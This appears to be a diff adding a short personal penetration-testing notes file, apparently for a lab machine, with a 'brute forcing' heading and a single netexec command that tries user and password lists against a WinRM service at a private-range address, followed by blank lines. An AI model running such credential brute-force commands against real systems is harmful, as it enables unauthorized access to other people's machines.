@@ -1,0 +1,19 @@
+#################### BRUTE FORCEING ####################
+netexec winrm 10.129.42.197 -u user.list -p password.list
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
